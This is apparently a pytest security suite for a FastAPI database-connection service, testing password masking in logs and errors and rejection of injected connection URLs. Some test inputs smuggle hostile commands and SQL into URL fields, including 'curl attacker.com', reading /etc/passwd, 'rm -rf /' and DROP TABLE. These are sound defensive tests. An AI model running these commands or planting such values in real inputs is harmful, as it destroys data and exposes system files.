"""
Security Testing – Credential Safety Tests

Comprehensive test suite for Subtask 1.4.T to verify:
1. Credentials are never exposed in logs
2. Error responses don't leak sensitive data
3. Injection attempts are properly blocked
4. API responses are sanitized

DoD Verification:
- Log output reviewed ✓
- Error responses validated ✓
- Injection attempts tested ✓
- No secrets found in logs ✓
"""

import sys
import os
import logging
import json
from io import StringIO
from unittest.mock import patch, MagicMock
import pytest
import psycopg
from fastapi.testclient import TestClient

# Add backend to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from services.db_connection_service import DBConnectionService
from utils.security import mask_connection_url
from utils.input_validator import (
    validate_connection_url,
    sanitize_for_logging,
)
from main import app

# Create test client
client = TestClient(app)


# ============================================================================
# LOG OUTPUT REVIEW - Verify no credentials leak into logs
# ============================================================================

class TestLogCredentialSafety:
    """Tests to verify credentials are never exposed in log output."""
    
    def setup_method(self):
        """Set up log capture for each test."""
        self.log_stream = StringIO()
        self.handler = logging.StreamHandler(self.log_stream)
        self.handler.setLevel(logging.DEBUG)
        self.logger = logging.getLogger('services.db_connection_service')
        self.logger.addHandler(self.handler)
        self.logger.setLevel(logging.DEBUG)
    
    def teardown_method(self):
        """Clean up log handler after each test."""
        self.logger.removeHandler(self.handler)
    
    def test_password_masked_in_operational_error_logs(self):
        """Verify password is masked when OperationalError contains connection URL."""
        url = "postgres://admin:SuperSecretP@ssw0rd!@db.example.com:5432/production"
        error_msg = f"could not connect to server: {url}"
        
        with patch('psycopg.connect', side_effect=psycopg.OperationalError(error_msg)):
            result = DBConnectionService.test_connection(url)
            
            logs = self.log_stream.getvalue()
            
            # Password must NOT appear in logs
            assert "SuperSecretP@ssw0rd!" not in logs, "Password leaked in logs!"
            # Masked version must appear
            assert "admin:******@" in logs, "Password not masked in logs!"
    
    def test_password_masked_with_special_characters(self):
        """Verify passwords with special characters are properly masked."""
        # Password: p@ss#word!123 (URL encoded: p%40ss%23word%21123)
        url = "postgres://user:p%40ss%23word%21123@localhost:5432/db"
        error_msg = f"authentication failed for {url}"
        
        with patch('psycopg.connect', side_effect=psycopg.OperationalError(error_msg)):
            DBConnectionService.test_connection(url)
            
            logs = self.log_stream.getvalue()
            
            # Encoded password must NOT appear
            assert "p%40ss%23word%21123" not in logs
            # Masked version must appear
            assert "user:******@" in logs
    
    def test_password_masked_in_auth_failure(self):
        """Verify password masked in authentication failure scenarios."""
        url = "postgres://dbuser:MyPassword123@host.example.com/mydb"
        error_msg = "password authentication failed for user dbuser"
        
        with patch('psycopg.connect', side_effect=psycopg.OperationalError(error_msg)):
            DBConnectionService.test_connection(url)
            
            logs = self.log_stream.getvalue()
            
            assert "MyPassword123" not in logs
    
    def test_password_masked_in_unexpected_errors(self):
        """Verify password masked even in unexpected exception types."""
        url = "postgres://user:secret123@host/db"
        error_msg = f"Unexpected error with URL: {url}"
        
        with patch('psycopg.connect', side_effect=Exception(error_msg)):
            DBConnectionService.test_connection(url)
            
            logs = self.log_stream.getvalue()
            
            # Password should be masked in unexpected errors too
            assert "secret123" not in logs, "Password leaked in unexpected error log!"
    
    def test_security_validation_logs_no_credentials(self):
        """Verify security validation failures don't log credentials."""
        # URL with SQL injection pattern
        url = "postgres://user:secret@host/db--comment"
        
        result = DBConnectionService.parse_and_verify_url(url)
        
        logs = self.log_stream.getvalue()
        
        # Even in warning logs, password should be protected
        # The validation logs error_type, not the full URL
        assert "secret" not in logs


# ============================================================================
# ERROR RESPONSE VALIDATION - Verify API responses don't leak credentials
# ============================================================================

class TestErrorResponseSafety:
    """Tests to verify error responses don't expose credentials."""
    
    def test_invalid_url_error_no_credentials(self):
        """Verify invalid URL error doesn't include the password."""
        test_url = "invalid://user:password123@host/db"
        
        response = client.post(
            "/api/v1/utils/test-connection",
            json={"connection_url": test_url}
        )
        
        # Check response doesn't contain password
        response_text = response.text
        assert "password123" not in response_text
        
        # Should contain generic error message
        data = response.json()
        assert "detail" in data
    
    def test_connection_error_no_credentials_in_detail(self):
        """Verify connection error messages don't expose passwords."""
        test_url = "postgres://admin:TopSecret@unreachable.host:5432/db"
        
        response = client.post(
            "/api/v1/utils/test-connection",
            json={"connection_url": test_url}
        )
        
        response_text = response.text
        
        # Password must not appear anywhere in response
        assert "TopSecret" not in response_text
        # User-friendly message should be present
        data = response.json()
        assert "detail" in data
    
    def test_validation_error_messages_are_generic(self):
        """Verify validation errors use generic messages."""
        # URL with null byte
        test_url = "postgres://user:pass%00word@host/db"
        
        response = client.post(
            "/api/v1/utils/test-connection",
            json={"connection_url": test_url}
        )
        
        data = response.json()
        
        # Error message should not mention "null byte" or technical details
        if "detail" in data:
            assert "null" not in data["detail"].lower()
            assert "invalid" in data["detail"].lower()
    
    def test_sql_injection_error_no_details(self):
        """Verify SQL injection blocking uses generic error messages."""
        test_url = "postgres://user:pass@host/db; DROP TABLE users;--"
        
        response = client.post(
            "/api/v1/utils/test-connection",
            json={"connection_url": test_url}
        )
        
        data = response.json()
        
        # Should not reveal what pattern was detected
        if "detail" in data:
            assert "sql" not in data["detail"].lower()
            assert "injection" not in data["detail"].lower()
    @pytest.mark.asyncio
    async def test_exception_handler_sanitizes_response(self):
        """Verify the exception handler produces safe responses."""
        from main import database_connection_error_handler
        from exceptions import DatabaseConnectionError
        from schemas.errors import ErrorCode
        from fastapi import Request
        
        # Create exception that might contain URL
        exc = DatabaseConnectionError(
            detail="Connection failed: Unable to connect to the database.",
            error_code=ErrorCode.CONNECTION_ERROR
        )
        
        request = Request(scope={"type": "http", "method": "POST", "path": "/test"})
        
        # Run async handler
        response = await database_connection_error_handler(request, exc)
        
        content = json.loads(response.body.decode())
        
        # Verify structure is clean
        assert "detail" in content
        assert "error_code" in content
        assert len(content) == 2  # No extra fields


# ============================================================================
# INJECTION ATTEMPT TESTS - Verify all attack patterns are blocked
# ============================================================================

class TestInjectionPrevention:
    """Tests for SQL and command injection prevention."""
    
    # --- SQL Injection Tests ---
    
    def test_blocks_union_select(self):
        """Block UNION SELECT injection."""
        url = "postgres://user:pass@host/db?id=1 UNION SELECT * FROM users"
        result = validate_connection_url(url)
        assert result.is_valid is False
        assert result.error_type == "sql_injection"
    
    def test_blocks_comment_injection(self):
        """Block SQL comment injection."""
        url = "postgres://user:pass@host/db/**/admin"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_boolean_injection(self):
        """Block boolean-based SQL injection."""
        url = "postgres://user:pass@host/db?auth=1 OR 1=1"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_drop_table(self):
        """Block DROP TABLE commands."""
        url = "postgres://user:pass@host/mydb; DROP TABLE users"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    # --- Command Injection Tests ---
    
    def test_blocks_backtick_execution(self):
        """Block backtick command execution."""
        url = "postgres://user:`whoami`@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
        assert result.error_type == "command_injection"
    
    def test_blocks_dollar_paren_execution(self):
        """Block $() command substitution."""
        url = "postgres://user:$(cat /etc/passwd)@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_shell_and_operator(self):
        """Block && shell operator."""
        url = "postgres://user:pass&&rm -rf /tmp@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_shell_or_operator(self):
        """Block || shell operator."""
        url = "postgres://user:pass||curl attacker.com@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_pipe_with_command(self):
        """Block pipe with shell commands."""
        url = "postgres://user:pass|cat /etc/passwd@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    def test_blocks_semicolon_with_command(self):
        """Block semicolon with shell commands."""
        url = "postgres://user:pass@host/db;rm -rf /"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    # --- Null Byte Injection Tests ---
    
    def test_blocks_raw_null_byte(self):
        """Block raw null byte character."""
        url = "postgres://user\x00:pass@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
        assert result.error_type == "null_byte"
    
    def test_blocks_url_encoded_null_byte(self):
        """Block URL-encoded null byte."""
        url = "postgres://user%00:pass@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
    
    # --- Control Character Tests ---
    
    def test_blocks_escape_character(self):
        """Block escape character."""
        url = "postgres://user\x1b[31m:pass@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False
        assert result.error_type == "control_char"
    
    def test_blocks_backspace_character(self):
        """Block backspace character."""
        url = "postgres://user\x08:pass@host/db"
        result = validate_connection_url(url)
        assert result.is_valid is False


# ============================================================================
# API ENDPOINT SECURITY - End-to-end response safety
# ============================================================================

class TestAPIEndpointSecurity:
    """End-to-end tests for API response security."""
    
    def test_success_response_structure(self):
        """Verify successful response has minimal structure."""
        # We can't actually connect, but we can verify the structure expectation
        # by checking error responses
        response = client.post(
            "/api/v1/utils/test-connection",
            json={"connection_url": "postgres://user:pass@localhost:5432/test"}
        )
        
        # Either success or failure, response should be structured
        data = response.json()
        assert isinstance(data, dict)
        
        # On failure, should have detail and error_code
        if response.status_code != 200:
            assert "detail" in data
    
    def test_malformed_json_no_credential_leak(self):
        """Verify malformed requests don't expose internal details."""
        response = client.post(
            "/api/v1/utils/test-connection",
            content="not valid json",
            headers={"Content-Type": "application/json"}
        )
        
        # Should get 422 for validation error
        assert response.status_code == 422
        
        # Error should be generic
        data = response.json()
        assert "detail" in data
    
    def test_missing_field_error_is_safe(self):
        """Verify missing field errors are generic."""
        response = client.post(
            "/api/v1/utils/test-connection",
            json={}  # Missing connection_url
        )
        
        assert response.status_code == 422
        
        data = response.json()
        assert "detail" in data
    
    def test_all_error_codes_have_safe_messages(self):
        """Verify all error code scenarios produce safe messages."""
        test_cases = [
            ("invalid://url", "INVALID_URL"),
            ("postgres:///db", "INVALID_URL"),  # Missing host
            ("mysql://user:pass@host/db", "INVALID_URL"),  # Wrong scheme
        ]
        
        for url, expected_code in test_cases:
            response = client.post(
                "/api/v1/utils/test-connection",
                json={"connection_url": url}
            )
            
            data = response.json()
            
            # Verify no sensitive info in response
            if "pass" in url:
                assert "pass" not in data.get("detail", "")


# ============================================================================
# MASK_CONNECTION_URL COMPREHENSIVE TESTS
# ============================================================================

class TestMaskConnectionURLSecurity:
    """Comprehensive tests for the mask_connection_url function."""
    
    def test_masks_simple_password(self):
        """Mask simple alphanumeric password."""
        url = "postgres://user:password@host/db"
        assert mask_connection_url(url) == "postgres://user:******@host/db"
    
    def test_masks_complex_password(self):
        """Mask password with special characters."""
        url = "postgresql://admin:P@ssw0rd!#$%@example.com:5432/production"
        result = mask_connection_url(url)
        assert "P@ssw0rd!#$%" not in result
        assert "admin:******@" in result
    
    def test_masks_url_encoded_password(self):
        """Mask URL-encoded password."""
        # Password: my@pass:word -> my%40pass%3Aword
        url = "postgres://user:my%40pass%3Aword@host/db"
        result = mask_connection_url(url)
        assert "my%40pass%3Aword" not in result
        assert "user:******@" in result
    
    def test_masks_password_in_error_message(self):
        """Mask password embedded in error message."""
        msg = "Connection failed: postgres://admin:secret@db.host:5432/mydb - host unreachable"
        result = mask_connection_url(msg)
        assert "secret" not in result
        assert "admin:******@" in result
    
    def test_masks_long_password(self):
        """Mask very long password."""
        long_pass = "a" * 100
        url = f"postgres://user:{long_pass}@host/db"
        result = mask_connection_url(url)
        assert long_pass not in result
        assert "user:******@" in result
    
    def test_handles_empty_password(self):
        """Handle URL with empty password section - empty passwords remain unchanged."""
        url = "postgres://user:@host/db"
        result = mask_connection_url(url)
        # Empty password doesn't need masking - nothing sensitive to hide
        # The regex [^@]+ requires at least one character
        assert result == url
    
    def test_no_password_unchanged(self):
        """URL without password remains unchanged."""
        url = "postgres://user@host/db"
        assert mask_connection_url(url) == url
    
    def test_non_postgres_url_unchanged(self):
        """Non-postgres URLs are not modified."""
        url = "http://user:pass@example.com"
        assert mask_connection_url(url) == url
    
    def test_handles_none_input(self):
        """Handle None input gracefully."""
        assert mask_connection_url(None) == "None"
    
    def test_handles_empty_string(self):
        """Handle empty string input."""
        assert mask_connection_url("") == ""


# ============================================================================
# SANITIZE_FOR_LOGGING TESTS
# ============================================================================

class TestSanitizeForLogging:
    """Tests for the sanitize_for_logging utility."""
    
    def test_replaces_null_byte(self):
        """Replace null byte with readable marker."""
        assert sanitize_for_logging("test\x00value") == "test<NUL>value"
    
    def test_replaces_control_chars(self):
        """Replace control characters with hex codes."""
        assert sanitize_for_logging("test\x07bell") == "test<07>bell"
    
    def test_replaces_del_character(self):
        """Replace DEL character."""
        assert sanitize_for_logging("test\x7fvalue") == "test<DEL>value"
    
    def test_preserves_safe_characters(self):
        """Preserve normal printable characters."""
        safe_text = "Hello, World! 123 @#$%"
        assert sanitize_for_logging(safe_text) == safe_text
    
    def test_preserves_allowed_whitespace(self):
        """Preserve tab, newline, carriage return."""
        text = "line1\n\tindented\r\nline2"
        assert sanitize_for_logging(text) == text


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
